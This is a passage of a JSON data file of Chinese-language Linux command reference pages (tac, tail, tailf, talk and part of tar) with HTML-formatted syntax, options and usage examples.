Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tac",
        "des": "连接多个文件并以行为单位反向打印到标准输出。",
        "body": "<h1 id=\"tac\">tac</h1>\n<p>连接多个文件并以行为单位反向打印到标准输出。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">tac [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>按行为单位反向显示文件内容，如果没有文件或文件为<code>-</code>则读取标准输入。</li>\n<li>处理多个文件时，依次将每个文件反向显示，而不是将所有文件连在一起再反向显示。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为一或多个。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">长选项与短选项等价\n\n-b, <span class=\"hljs-comment\">--before              在之前而不是之后连接分隔符。</span>\n-r, <span class=\"hljs-comment\">--regex               将分隔符作为基础正则表达式（BRE）处理。</span>\n-s, <span class=\"hljs-comment\">--separator=STRING    使用STRING作为分隔符代替默认的换行符。</span>\n<span class=\"hljs-comment\">--help                    显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version                 显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 选自官方info文档的例子：</span>\n<span class=\"hljs-meta\"># 一个接着一个字符的反转一个文件：</span>\ntac -r -s <span class=\"hljs-string\">'x\\|[^x]'</span> test.<span class=\"hljs-built_in\">log</span>\n\n<span class=\"hljs-meta\"># 关于-b选项：</span>\nseq <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">3</span> |tac\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-number\">3</span>\n<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">1</span>\n<span class=\"hljs-meta\"># 使用-b选项：</span>\nseq <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">3</span> |tac -b\n<span class=\"hljs-meta\"># 输出，注意21后面没有换行符：</span>\n\n\n<span class=\"hljs-number\">3</span>\n<span class=\"hljs-number\">21</span>\n<span class=\"hljs-meta\"># 前一个例子相当于将 <span class=\"hljs-string\">'1\\n2\\n3\\n'</span> 转换为 <span class=\"hljs-string\">'3\\n2\\n1\\n'</span></span>\n<span class=\"hljs-meta\"># 前一个例子相当于将 <span class=\"hljs-string\">'1\\n2\\n3\\n'</span> 转换为 <span class=\"hljs-string\">'\\n\\n3\\n21'</span></span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 tac</code>或<code>info coreutils 'tac invocation'</code>。</li>\n<li>关于基础正则表达式（BRE）的内容，详见<code>man -s 1 grep</code>的<code>REGULAR EXPRESSIONS</code>段落。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tail",
        "des": "在屏幕上显示指定文件的末尾若干行",
        "body": "<h1 id=\"tail\">tail</h1>\n<p>在屏幕上显示指定文件的末尾若干行</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tail命令</strong> 用于输入文件中的尾部内容。</p>\n<ul>\n<li>默认在屏幕上显示指定文件的末尾10行。</li>\n<li>处理多个文件时会在各个文件之前附加含有文件名的行。</li>\n<li>如果没有指定文件或者文件名为<code>-</code>，则读取标准输入。</li>\n<li>如果表示字节或行数的<code>NUM</code>值之前有一个<code>+</code>号，则从文件开头的第<code>NUM</code>项开始显示，而不是显示文件的最后<code>NUM</code>项。</li>\n<li><code>NUM</code>值后面可以有后缀：<ul>\n<li><code>b</code>  : 512</li>\n<li><code>kB</code> : 1000</li>\n<li><code>k </code> : 1024</li>\n<li><code>MB</code> : 1000 * 1000</li>\n<li><code>M </code> : 1024 * 1024</li>\n<li><code>GB</code> : 1000 * 1000 * 1000</li>\n<li><code>G </code> : 1024 * 1024 * 1024</li>\n<li><code>T</code>、<code>P</code>、<code>E</code>、<code>Z</code>、<code>Y</code>等以此类推。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tail</span> <span class=\"hljs-params\">(选项)</span> <span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">c</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">bytes=NUM</span>                 <span class=\"hljs-comment\">输出文件尾部的NUM（NUM为整数）个字节内容。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">follow</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">={name|descript}</span><span class=\"hljs-title\">]</span>  <span class=\"hljs-comment\">显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">F</span>                              <span class=\"hljs-comment\">与</span> <span class=\"hljs-comment\">“</span>--<span class=\"hljs-comment\">follow=name</span> --<span class=\"hljs-comment\">retry”</span> <span class=\"hljs-comment\">功能相同。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">n</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">line=NUM</span>                  <span class=\"hljs-comment\">输出文件的尾部NUM（NUM位数字）行内容。</span>\n--<span class=\"hljs-comment\">pid=</span>&lt;<span class=\"hljs-comment\">进程号</span>&gt;                  <span class=\"hljs-comment\">与“</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f”选项连用，当指定的进程号的进程终止后，自动退出tail命令。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">q</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">quiet</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">silent</span>           <span class=\"hljs-comment\">当有多个文件参数时，不输出各个文件名。</span>\n--<span class=\"hljs-comment\">retry</span>                         <span class=\"hljs-comment\">即是在tail命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“</span>--<span class=\"hljs-comment\">follow=name”连用。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">sleep</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">interal=</span>&lt;<span class=\"hljs-comment\">秒数</span>&gt;      <span class=\"hljs-comment\">与“</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f”选项连用，指定监视文件变化时间隔的秒数。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">v</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">verbose</span>                   <span class=\"hljs-comment\">当有多个文件参数时，总是输出各个文件名。</span>\n--<span class=\"hljs-comment\">help</span>                          <span class=\"hljs-comment\">显示指令的帮助信息。</span>\n--<span class=\"hljs-comment\">version</span>                       <span class=\"hljs-comment\">显示指令的版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定要显示尾部内容的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">tail</span> file <span class=\"hljs-comment\">#（显示文件file的最后10行）</span>\n<span class=\"hljs-built_in\">tail</span> -n +<span class=\"hljs-number\">20</span> file <span class=\"hljs-comment\">#（显示文件file的内容，从第20行至文件末尾）</span>\n<span class=\"hljs-built_in\">tail</span> -c <span class=\"hljs-number\">10</span> file <span class=\"hljs-comment\">#（显示文件file的最后10个字节）</span>\n\n<span class=\"hljs-built_in\">tail</span> -<span class=\"hljs-number\">25</span> mail.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-comment\"># 显示 mail.log 最后的 25 行</span>\n<span class=\"hljs-built_in\">tail</span> -f mail.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-comment\"># 等同于--follow=descriptor，根据文件描述符进行追踪，当文件改名或被删除，追踪停止</span>\n<span class=\"hljs-built_in\">tail</span> -F mail.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-comment\"># 等同于--follow=name --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tailf",
        "des": "在屏幕上显示指定文件的末尾若干行内容，通常用于日志文件的跟踪输出",
        "body": "<h1 id=\"tailf\">tailf</h1>\n<p>在屏幕上显示指定文件的末尾若干行内容，通常用于日志文件的跟踪输出</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>tailf命令几乎等同于<code>tail -f</code>，严格说来应该与<code>tail --follow=name</code>更相似些。当文件改名之后它也能继续跟踪，特别适合于日志文件的跟踪（follow the growth of a log file）。与<code>tail -f</code>不同的是，如果文件不增长，它不会去访问磁盘文件。tailf特别适合那些便携机上跟踪日志文件，因为它能省电，因为减少了磁盘访问。tailf命令不是个脚本，而是一个用C代码编译后的二进制执行文件，某些Linux安装之后没有这个命令。</p>\n<p>tailf和tail -f的区别</p>\n<ol>\n<li>tailf 总是从文件开头一点一点的读， 而tail -f 则是从文件尾部开始读</li>\n<li>tailf check文件增长时，使用的是文件名， 用stat系统调用；而tail -f 则使用的是已打开的文件描述符； 注：tail 也可以做到类似跟踪文件名的效果； 但是tail总是使用fstat系统调用，而不是stat系统调用；结果就是：默认情况下，当tail的文件被偷偷删除时，tail是不知道的，而tailf是知道的。</li>\n</ol>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tailf</span> logfile <span class=\"hljs-comment\"># 动态跟踪日志文件logfile，最初的时候打印文件的最后10行内容。</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>n, --lines NUMBER  <span class=\"hljs-comment\"># 输出最后数行</span>\n<span class=\"hljs-literal\">-</span>NUMBER             <span class=\"hljs-comment\"># 与NUMBER相同 `-n NUMBER'</span>\n<span class=\"hljs-literal\">-</span>V, --version       <span class=\"hljs-comment\"># 输出版本信息并退出</span>\n<span class=\"hljs-literal\">-</span>h, --help          <span class=\"hljs-comment\"># 显示帮助并退出</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定目标日志。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">tailf <span class=\"hljs-built_in\">log</span>/WEB.<span class=\"hljs-built_in\">LOG</span> \ntailf -n <span class=\"hljs-number\">5</span> log2014.<span class=\"hljs-built_in\">log</span>   <span class=\"hljs-meta\"># 显示文件最后5行内容</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "talk",
        "des": "让用户和其他用户聊天",
        "body": "<h1 id=\"talk\">talk</h1>\n<p>让用户和其他用户聊天</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>talk命令</strong> 是talk服务器的客户端工具，通过talk命令可以让用户和其他用户聊天。linux中talk命令参数程序的使用很简单，只要知道交谈对象的地址，就可以邀请对方交谈。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">talk</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  用户：指定聊天的用户；</li>\n<li>  终端：指定用户的终端。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>例如登录在主机rs6000.cic.test.com上的用户jdx希望和登录在主机tirc.cs.test.com上的用户wangxz进行交谈，则可以输入下面的命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">talk</span> wangxz<span class=\"hljs-variable\">@tirc</span>.cs.test.com\n</code></pre>\n<p>Internet上的相关程序（Talk Daemon）就会传送一条信息邀请wangxz来交谈，这时用户wangxz的屏幕上就会出现如下信息，并响铃提示：</p>\n<pre><code class=\"language-shell\">Message from Talk_Daemon@tirc<span class=\"hljs-selector-class\">.cs</span><span class=\"hljs-selector-class\">.test</span><span class=\"hljs-selector-class\">.com</span> at <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">44</span> …\ntalk: connection requested by jdx@rs6000<span class=\"hljs-selector-class\">.cic</span><span class=\"hljs-selector-class\">.test</span><span class=\"hljs-selector-class\">.com</span>\ntalk: respond with:  talk jdx@rs6000<span class=\"hljs-selector-class\">.cic</span><span class=\"hljs-selector-class\">.test</span>.com\n</code></pre>\n<p>这时，用户wangxz应该做的工作就是按照上面的信息提示，即输入linux中talk命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">talk</span> jdx<span class=\"hljs-variable\">@rs6000</span>.cic.test.com\n</code></pre>\n<p>之后，连接建立成功，两个用户就可以进行交谈了。这时，双方的终端屏幕上都将显示信息 <strong>[Connection established]</strong> 并响铃，同时屏幕被linux中talk命令程序以一条水平线分割为上下两部分，上半部分用来显示用户自己输入的内容，下半部分用来显示对方输入的内容。两个用户可以同时输入，他们输入的内容将会立即显示在双方的屏幕上。</p>\n<p>在用户进行输入时，可按 <strong>BACKSPACE</strong> 见来更正前一个字符，也可按 <strong>CTRL+w</strong> 来删除一个完整的单词，或者用 <strong>CTRL+U</strong> 来删除一整行，另外，用户还可以通过按 <strong>CTRL+L</strong> 来刷新屏幕。如果要结束交谈，可由任何一方按下 <strong>CTRL+C</strong> 来中断连接，但在结束对话前最好道声“再见”，并等待对方回应。linux中talk命令程序结束时，在屏幕上将回显示一条信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[Connection closing. Exiting]</span>\n</code></pre>\n<p>并非每次要求对方交谈都能成功，有时对方没有登录，则linux中talk命令程序提示信息：</p>\n<pre><code class=\"language-shell\">[Your party <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">logged</span> <span class=\"hljs-keyword\">on</span>]\n</code></pre>\n<p>并退出；如果对方已登录，但因某种原因（如不是正在使用机器）没有响应，那么linux中talk命令程序将会每隔10秒钟给他发一条邀请信息，同时在自己的屏幕上显示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[Ringing your party again]</span>\n</code></pre>\n<p>如果用户不愿等待，则可以按 <strong>CTRL+C</strong> 终止linux中talk命令程序。还有的时候系统可能出现下面的信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[Checking for invitation on caller’s machine]</span>\n</code></pre>\n<p>这说明双方的linux中talk命令程序不兼容，这时可以试试ntalk和ytalk命令，如果没有，就只好找系统管理员了。</p>\n<p>如果用户在做某些紧急工作（如编辑邮件）时不希望被linux中talk命令的邀请打搅，他可以使用命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mesg n</span>\n</code></pre>\n<p>来暂时拒绝交谈，这时如果有用户邀请他交谈，只能得到提示信息：</p>\n<pre><code class=\"language-shell\">[Your party <span class=\"hljs-keyword\">is</span> refusing <span class=\"hljs-keyword\">messages</span>]\n</code></pre>\n<p>不过要注意的是，一旦完成紧急工作。最好立即打开信息接收开关（用命令<code>mesg y</code>），否则将会失去很多信息交流的机会。</p>\n<p>以上是linux中talk命令参数的是使用方法。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tar",
        "des": "将许多文件一起保存至一个单独的磁带或磁盘归档，并能从归档中单独还原所需文件。",
        "body": "<h1 id=\"tar\">tar</h1>\n<p>将许多文件一起保存至一个单独的磁带或磁盘归档，并能从归档中单独还原所需文件。</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tar命令</strong> 可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。</p>\n<p>首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</p>\n<p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip&nbsp;bzip2命令）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">tar [选项...] [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">A</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">catenate</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">concatenate</span>   <span class=\"hljs-comment\">追加</span> <span class=\"hljs-comment\">tar</span> <span class=\"hljs-comment\">文件至归档</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">c</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">create</span>               <span class=\"hljs-comment\">创建一个新归档</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">d</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">diff</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">compare</span>      <span class=\"hljs-comment\">找出归档和文件系统的差异</span>\n    --<span class=\"hljs-comment\">delete</span>               <span class=\"hljs-comment\">从归档(非磁带！)中删除</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">r</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">append</span>               <span class=\"hljs-comment\">追加文件至归档结尾</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">t</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">list</span>                 <span class=\"hljs-comment\">列出归档内容</span>\n    --<span class=\"hljs-comment\">test</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">label</span>           <span class=\"hljs-comment\">测试归档卷标并退出</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">u</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">update</span>               <span class=\"hljs-comment\">仅追加比归档中副本更新的文件</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">x</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">extract</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">get</span>       <span class=\"hljs-comment\">从归档中解出文件</span>\n\n<span class=\"hljs-comment\">操作修饰符:</span>\n\n      --<span class=\"hljs-comment\">check</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">device</span>         <span class=\"hljs-comment\">当创建增量归档时检查设备号(默认)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">g</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">listed</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">incremental=FILE</span>   <span class=\"hljs-comment\">处理新式的</span> <span class=\"hljs-comment\">GNU</span> <span class=\"hljs-comment\">格式的增量备份</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">G</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">incremental</span>          <span class=\"hljs-comment\">处理老式的</span> <span class=\"hljs-comment\">GNU</span> <span class=\"hljs-comment\">格式的增量备份</span>\n      --<span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">failed</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">read</span>\n                             <span class=\"hljs-comment\">当遇上不可读文件时不要以非零值退出</span>\n      --<span class=\"hljs-comment\">level=NUMBER</span>         <span class=\"hljs-comment\">所创建的增量列表归档的输出级别</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">n</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">seek</span>                 <span class=\"hljs-comment\">归档可检索</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">check</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">device</span>      <span class=\"hljs-comment\">当创建增量归档时不要检查设备号</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">seek</span>              <span class=\"hljs-comment\">归档不可检索</span>\n      --<span class=\"hljs-comment\">occurrence</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">=NUMBER</span><span class=\"hljs-title\">]</span>  <span class=\"hljs-comment\">仅处理归档中每个文件的第</span> <span class=\"hljs-comment\">NUMBER</span>\n                             <span class=\"hljs-comment\">个事件；仅当与以下子命令</span> --<span class=\"hljs-comment\">delete</span><span class=\"hljs-string\">,</span>\n                             --<span class=\"hljs-comment\">diff</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">extract</span> <span class=\"hljs-comment\">或是</span> --<span class=\"hljs-comment\">list</span>\n                             <span class=\"hljs-comment\">中的一个联合使用时，此选项才有效。而且不管文件列表是以命令行形式给出或是通过</span>\n                             <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span> <span class=\"hljs-comment\">选项指定的；NUMBER</span> <span class=\"hljs-comment\">值默认为</span> <span class=\"hljs-comment\">1</span>\n      --<span class=\"hljs-comment\">sparse</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">version=MAJOR</span><span class=\"hljs-title\">[</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">MINOR</span><span class=\"hljs-title\">]</span>\n                             <span class=\"hljs-comment\">设置所用的离散格式版本(隐含</span>\n                             --<span class=\"hljs-comment\">sparse)</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">S</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">sparse</span>               <span class=\"hljs-comment\">高效处理离散文件</span>\n\n <span class=\"hljs-comment\">重写控制:</span>\n\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">k</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">keep</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">old</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">files       don't replace existing files</span> <span class=\"hljs-comment\">when</span> <span class=\"hljs-comment\">extracting</span><span class=\"hljs-string\">,</span>\n                             <span class=\"hljs-comment\">treat</span> <span class=\"hljs-comment\">them</span> <span class=\"hljs-comment\">as</span> <span class=\"hljs-comment\">errors</span>\n      --<span class=\"hljs-comment\">keep</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">directory</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">symlink   preserve existing symlinks to</span> <span class=\"hljs-comment\">directories</span> <span class=\"hljs-comment\">when</span>\n                             <span class=\"hljs-comment\">extracting</span>\n      --<span class=\"hljs-comment\">keep</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">newer</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">files</span>\n                             <span class=\"hljs-comment\">不要替换比归档中副本更新的已存在的文件</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">overwrite</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dir</span>     <span class=\"hljs-comment\">保留已存在目录的元数据</span>\n      --<span class=\"hljs-comment\">overwrite</span>            <span class=\"hljs-comment\">解压时重写存在的文件</span>\n      --<span class=\"hljs-comment\">overwrite</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dir</span>        <span class=\"hljs-comment\">解压时重写已存在目录的元数据(默认)</span>\n\n      --<span class=\"hljs-comment\">recursive</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">unlink</span>     <span class=\"hljs-comment\">解压目录之前先清除目录层次</span>\n      --<span class=\"hljs-comment\">remove</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">files</span>         <span class=\"hljs-comment\">在添加文件至归档后删除它们</span>\n      --<span class=\"hljs-comment\">skip</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">old</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">files       don't replace existing files</span> <span class=\"hljs-comment\">when</span> <span class=\"hljs-comment\">extracting</span><span class=\"hljs-string\">,</span>\n                             <span class=\"hljs-comment\">silently</span> <span class=\"hljs-comment\">skip</span> <span class=\"hljs-comment\">over</span> <span class=\"hljs-comment\">them</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">U</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">unlink</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">first</span>         <span class=\"hljs-comment\">在解压要重写的文件之前先删除它们</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">W</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">verify</span>               <span class=\"hljs-comment\">在写入以后尝试校验归档</span>\n\n <span class=\"hljs-comment\">选择输出流:</span>\n\n      --<span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">error</span> <span class=\"hljs-comment\">忽略子进程的退出代码</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">ignore</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">error</span>\n                             <span class=\"hljs-comment\">将子进程的非零退出代码认为发生错误</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">O</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">to</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">stdout</span>            <span class=\"hljs-comment\">解压文件至标准输出</span>\n      --<span class=\"hljs-comment\">to</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">command=COMMAND</span>\n                             <span class=\"hljs-comment\">将解压的文件通过管道传送至另一个程序</span>\n\n <span class=\"hljs-comment\">操作文件属性:</span>\n\n      --<span class=\"hljs-comment\">atime</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">preserve</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">=METHOD</span><span class=\"hljs-title\">]</span>\n                             <span class=\"hljs-comment\">在输出的文件上保留访问时间，要么通过在读取(默认</span>\n                             <span class=\"hljs-comment\">METHOD=‘replace’)后还原时间，要不就不要在第一次(METHOD=‘system’)设置时间</span>\n      --<span class=\"hljs-comment\">delay</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">directory</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">restore</span>\n                             <span class=\"hljs-comment\">直到解压结束才设置修改时间和所解目录的权限</span>\n      --<span class=\"hljs-comment\">group=名称</span>         <span class=\"hljs-comment\">强制将</span> <span class=\"hljs-comment\">NAME</span>\n                             <span class=\"hljs-comment\">作为所添加的文件的组所有者</span>\n      --<span class=\"hljs-comment\">mode=CHANGES</span>         <span class=\"hljs-comment\">强制将所添加的文件(符号)更改为权限</span>\n                             <span class=\"hljs-comment\">CHANGES</span>\n      --<span class=\"hljs-comment\">mtime=DATE</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">OR</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">FILE</span>   <span class=\"hljs-comment\">从</span> <span class=\"hljs-comment\">DATE</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">OR</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">FILE</span> <span class=\"hljs-comment\">中为添加的文件设置</span>\n                             <span class=\"hljs-comment\">mtime</span>\n  <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">m</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">touch</span>                <span class=\"hljs-comment\">不要解压文件的修改时间</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">delay</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">directory</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">restore</span>\n                             <span class=\"hljs-comment\">取消</span> --<span class=\"hljs-comment\">delay</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">directory</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">restore</span> <span class=\"hljs-comment\">选项的效果</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">owner</span>\n                             <span class=\"hljs-comment\">将文件解压为您所有(普通用户默认此项)</span>\n      --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">same</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">permissions</span>\n                             <span class=\"hljs-comment\">从归档中解压权限时使用用户的掩码位(默认为普通用户服务)</span>\n      --<span class=\"hljs-comment\">numeric</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">owner</span>        <span class=\"hljs-comment\">总是以数字代表用户/组的名称</span>\n      --<span class=\"hljs-comment\">owner=名称</span>         <span 